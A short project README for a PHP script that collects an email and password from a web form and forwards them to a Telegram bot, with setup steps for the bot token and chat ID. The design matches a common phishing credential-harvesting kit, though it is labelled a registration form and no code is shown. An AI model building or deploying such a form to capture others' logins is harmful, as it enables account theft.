# Registration-form
# Telegram Form Submission

![Screenshot 2024-08-09 044033](https://github.com/user-attachments/assets/52c93089-2752-413b-b5ce-5ded4284577b)

# Telegram Form Submission

This PHP script receives form data and sends it to a Telegram bot.

## Requirements

- PHP 5.4 or above
- A Telegram bot token (obtain from @BotFather)
- A Telegram chat ID (obtain by sending a message to your bot and then inspecting the URL)

## Installation

1. Replace `'BOT_TOKEN'` with your actual bot token in the PHP script.
2. Replace `'CHAT_ID'` with the chat ID where you want to send the message in the PHP script.
3. Upload the PHP script to your web server.
4. Ensure that the form on your web page has the correct `action` and `method` attributes set.

## Usage

1. Access the PHP script through the web browser.
2. Fill in the form with your email and password.
3. Click the "Continue" button to submit the form.
4. The script will send the form data to the specified Telegram chat using the bot token.

## License

This code is licensed under the [MIT License](LICENSE).
